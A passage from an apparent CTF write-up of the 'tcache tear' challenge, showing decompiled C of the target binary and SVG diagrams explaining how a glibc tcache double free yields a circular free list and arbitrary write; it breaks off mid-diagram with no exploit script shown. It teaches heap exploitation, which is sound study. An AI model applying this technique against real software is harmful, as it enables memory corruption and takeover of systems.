justify-content: unsafe flex-start; width: 168px; height: 1px; padding-top: 850px; margin-left: 2px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;"><h1>tcache free</h1></div></div></div></foreignObject><text font-size="12px" x="2" y="854" fill="#000000" font-family="Helvetica">tcache free</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a target="_blank" transform="translate(0,-5)" xlink:href="https://desk.draw.io/support/solutions/articles/16000042487"><text font-size="10px" x="50%" y="100%" text-anchor="middle">Viewer does not support full SVG 1.1</text></a></switch></svg><h1 id="reversing">Reversing</h1><p>First, we have to reverse the binary, which isn't too difficult with Ghidra.</p><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">main</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">)
{
  longlong input;
  </span><span style="color:#0086b3;">uint</span><span style="color:#323232;"> i;
  
  set_alarm();
  </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Name:&quot;</span><span style="color:#323232;">);
  read(buffer,</span><span style="color:#0086b3;">0x20</span><span style="color:#323232;">);
  i </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
  </span><span style="font-weight:bold;color:#a71d5d;">do </span><span style="color:#323232;">{
    </span><span style="font-weight:bold;color:#a71d5d;">while</span><span style="color:#323232;">( </span><span style="color:#0086b3;">true </span><span style="color:#323232;">) {
      </span><span style="font-weight:bold;color:#a71d5d;">while</span><span style="color:#323232;">( </span><span style="color:#0086b3;">true </span><span style="color:#323232;">) {
        print_menu();
        input </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">read_ll();
        </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(input </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#0086b3;">2</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
        </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(i </span><span style="font-weight:bold;color:#a71d5d;">&lt; </span><span style="color:#0086b3;">8</span><span style="color:#323232;">) {
          </span><span style="color:#62a35c;">free</span><span style="color:#323232;">(malloced);
          i </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> i </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">1</span><span style="color:#323232;">;
        }
      }
      </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(</span><span style="color:#0086b3;">2 </span><span style="font-weight:bold;color:#a71d5d;">&lt;</span><span style="color:#323232;"> input) </span><span style="font-weight:bold;color:#a71d5d;">break</span><span style="color:#323232;">;
      </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(input </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#0086b3;">1</span><span style="color:#323232;">) {
        malloc_m();
      }
      </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
LAB_00400c75:
        </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Invalid choice&quot;</span><span style="color:#323232;">);
      }
    }
    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(input </span><span style="font-weight:bold;color:#a71d5d;">!= </span><span style="color:#0086b3;">3</span><span style="color:#323232;">) {
      </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(input </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#0086b3;">4</span><span style="color:#323232;">) {
                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
        </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
      }
      </span><span style="font-weight:bold;color:#a71d5d;">goto</span><span style="color:#323232;"> LAB_00400c75;
    }
    print_buffer();
  } </span><span style="font-weight:bold;color:#a71d5d;">while</span><span style="color:#323232;">( </span><span style="color:#0086b3;">true </span><span style="color:#323232;">);
}
</span></code></pre><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">malloc_m</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">)
{
  ulong size;
  
  </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Size:&quot;</span><span style="color:#323232;">);
  size </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">read_ll();
  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(size </span><span style="font-weight:bold;color:#a71d5d;">&lt; </span><span style="color:#0086b3;">0x100</span><span style="color:#323232;">) {
    malloced </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">malloc</span><span style="color:#323232;">(size);
    </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Data:&quot;</span><span style="color:#323232;">);
    read((</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)malloced,(</span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;">)size </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#0086b3;">0x10</span><span style="color:#323232;">);
    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Done !&quot;</span><span style="color:#323232;">);
  }
  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
}
</span></code></pre><p>The binary reads <code>0x20</code> bytes into a global buffer. Then, it displays a menu:</p><p><img alt="" src="/posts/pwnable-tw-tcache-tear/5d99297adf0cde08ea5c061d.png"></p><p>We are able to <code>malloc</code> arbitrary sizes (under 0x100) and <code>free</code> the last allocated chunk (up to 8 times).</p><h1 id="attacks">Attacks</h1><h2 id="circular-list">Circular List</h2><p>The given tcache implementation has no checks to detect double frees. Consider the following initial state:</p> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg height="352px" version="1.1" viewBox="-0.5 -0.5 552 352" width="552px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs/><g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="301"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 326px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><b>NULL</b></div></div></div></foreignObject><text font-size="12px" x="305" y="330" fill="#000000" font-family="Helvetica" text-anchor="middle">NULL</text></switch></g><rect fill="#ffffff" height="100" pointer-events="all" stroke="#000000" width="160" x="0" y="21"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 21px; margin-left: 0px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 100%"><b>tcache_perthread_struct</b></p><hr size="1"/>   char counts[]<br/><hr/>   tcache_entry *entries[]<hr/><b><div style="text-align: center"><b>0x7ffff7dcfc40</b></div></b></div></div></div></foreignObject><text font-size="12px" x="0" y="33" fill="#000000" font-family="Helvetica">tcache_perthread_struct   c...</text></switch></g><path d="M 385 221 L 400 221 L 400 281 L 305 281 L 305 294.63" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 305 299.88 L 301.5 292.88 L 305 294.63 L 308.5 292.88 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="181"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 181px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="193" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="240" y="1"/><path d="M 260 1 L 240 1 L 240 141 L 260 141" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2"/><path d="M 305 96 L 305 174.63" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 305 179.88 L 301.5 172.88 L 305 174.63 L 308.5 172.88 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="46"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;">Bin<br/>1</div></div></div></foreignObject><text font-size="12px" x="305" y="75" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="430" y="46"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 485px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><font style="font-size: 12px">Bin <br/><span style="background-color: rgb(255 , 255 , 255) ; font-family: &quot;consolas&quot; , &quot;courier new&quot; , monospace ; white-space: pre">TCACHE_MAX_BINS</span></font></div></div></div></foreignObject><text font-size="12px" x="485" y="75" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><ellipse cx="375" cy="71" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="395" cy="71" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="415" cy="71" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="530" y="1" transform="rotate(-180,540,71)"/><path d="M 550 1 L 530 1 L 530 141 L 550 141" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2" transform="rotate(-180,540,71)"/><path d="M 160 86 L 233.63 86" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 238.88 86 L 231.88 89.5 L 233.63 86 L 231.88 82.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a target="_blank" transform="translate(0,-5)" xlink:href="https://desk.draw.io/support/solutions/articles/16000042487"><text font-size="10px" x="50%" y="100%" text-anchor="middle">Viewer does not support full SVG 1.1</text></a></switch></svg><p>If we call <code>free(0x603260)</code> twice, we add the <code>tcache_entry</code> to the free list again, which results in a circular list:</p> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg height="382px" version="1.1" viewBox="-0.5 -0.5 552 382" width="552px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs/><g><rect fill="#ffffff" height="100" pointer-events="all" stroke="#000000" width="160" x="0" y="21"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 21px; margin-left: 0px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 100%"><b>tcache_perthread_struct</b></p><hr size="1"/>   char counts[]<br/><hr/>   tcache_entry *entries[]<hr/><b><div style="text-align: center"><b>0x7ffff7dcfc40</b></div></b></div></div></div></foreignObject><text font-size="12px" x="0" y="33" fill="#000000" font-family="Helvetica">tcache_perthread_struct   c...</text></switch></g><path d="M 385 221 L 400 221 L 400 281 L 305 281 L 305 294.63" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 305 299.88 L 301.5 292.88 L 305 294.63 L 308.5 292.88 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="181"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 181px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="193" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="240" y="1"/><path d="M 260 1 L 240 1 L 240 141 L 260 141" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2"/><path d="M 305 96 L 305 174.63" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 305 179.88 L 301.5 172.88 L 305 174.63 L 308.5 172.88 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="46"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;">Bin<br/>1</div></div></div></foreignObject><text font-size="12px" x="305" y="75" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="430" y="46"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 485px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><font style="font-size: 12px">Bin <br/><span style="background-color: rgb(255 , 255 , 255) ; font-family: &quot;consolas&quot; , &quot;courier new&quot; , monospace ; white-space: pre">TCACHE_MAX_BINS</span></font></div></div></div></foreignObject><text font-size="12px" x="485" y="75" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><ellipse cx="375" cy="71" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="395" cy="71" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="415" cy="71" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="530" y="1" transform="rotate(-180,540,71)"/><path d="M 550 1 L 530 1 L 530 141 L 550 141" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2" transform="rotate(-180,540,71)"/><path d="M 160 86 L 233.63 86" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 238.88 86 L 231.88 89.5 L 233.63 86 L 231.88 82.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 385 341 L 440 341 L 440 161 L 305 161 L 305 174.63" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 305 179.88 L 301.5 172.88 L 305 174.63 L 308.5 172.88 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="301"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 301px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="313" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a target="_blank" transform="translate(0,-5)" xlink:href="https://desk.draw.io/support/solutions/articles/16000042487"><text font-size="10px" x="50%" y="100%" text-anchor="middle">Viewer does not support full SVG 1.1</text></a></switch></svg><p>If we call <code>malloc</code> now with the same size as the double freed chunk, we will receive that chunk again. If we are able to write in the chunk, we can overwrite the <code>next</code> pointer because libc does not expect the chunk to be in use. Then, <code>malloc</code> will return the written address + 0x10 due to the chunk header.</p><h2 id="achieving-arbitrary-write">Achieving Arbitrary Write</h2><p>We can abuse this double free to force malloc to return an arbitrary pointer to any memory location. Because the binary allows us to write to the location returned by malloc, we have arbitrary write:</p> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg height="1422px" version="1.1" viewBox="-0.5 -0.5 621 1422" width="621px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs/><g><rect fill="#ffffff" height="100" pointer-events="all" stroke="#000000" width="160" x="0" y="21"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 21px; margin-left: 0px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 100%"><b>tcache_perthread_struct</b></p><hr size="1"/>   char counts[]<br/><hr/>   tcache_entry *entries[]<hr/><b><div style="text-align: center"><b>0x7ffff7dcfc40</b></div></b></div></div></div></foreignObject><text font-size="12px" x="0" y="33" fill="#000000" font-family="Helvetica">tcache_perthread_struct   c...</text></switch></g><path d="M 385 221 L 400 221 L 400 281 L 305 281 L 305 294.63" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 305 299.88 L 301.5 292.88 L 305 294.63 L 308.5 292.88 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="181"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 181px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="193" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="240" y="1"/><path d="M 260 1 L 240 1 L 240 141 L 260 141" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2"/><path d="M 305 96 L 305 151 L 200 151 L 200 281 L 280.4 281 L 280.37 293.83" fill="none" pointer-events="stroke" stroke="#b85450" stroke-miterlimit="10"/><path d="M 280.36 299.08 L 276.88 292.07 L 280.37 293.83 L 283.88 292.09 Z" fill="#b85450" pointer-events="all" stroke="#b85450" stroke-miterlimit="10"/><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="46"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;">Bin<br/>1</div></div></div></foreignObject><text font-size="12px" x="305" y="75" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="430" y="46"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 485px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><font style="font-size: 12px">Bin <br/><span style="background-color: rgb(255 , 255 , 255) ; font-family: &quot;consolas&quot; , &quot;courier new&quot; , monospace ; white-space: pre">TCACHE_MAX_BINS</span></font></div></div></div></foreignObject><text font-size="12px" x="485" y="75" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><ellipse cx="375" cy="71" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="395" cy="71" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="415" cy="71" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="530" y="1" transform="rotate(-180,540,71)"/><path d="M 550 1 L 530 1 L 530 141 L 550 141" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2" transform="rotate(-180,540,71)"/><path d="M 160 86 L 233.63 86" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 238.88 86 L 231.88 89.5 L 233.63 86 L 231.88 82.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 385 341 L 440 341 L 440 161 L 305 161 L 305 174.63" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 305 179.88 L 301.5 172.88 L 305 174.63 L 308.5 172.88 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="301"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 301px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="313" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><path d="M 140 221 L 180 221 L 180 313.3 L 219.59 313.32" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 224.84 313.32 L 217.84 316.82 L 219.59 313.32 L 217.84 309.82 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 140 221 L 180 221 L 180 190.1 L 218.63 190.12" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 223.88 190.12 L 216.88 193.62 L 218.63 190.12 L 216.88 186.62 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="60" pointer-events="all" stroke="#000000" width="120" x="20" y="191"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 221px; margin-left: 21px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">void* malloc()<br/>(malloc 1)</div></div></div></foreignObject><text font-size="12px" x="80" y="225" fill="#000000" font-family="Helvetica" text-anchor="middle">void* malloc()...</text></switch></g><rect fill="none" height="140" pointer-events="all" stroke="none" width="160" x="0" y="281"/><g 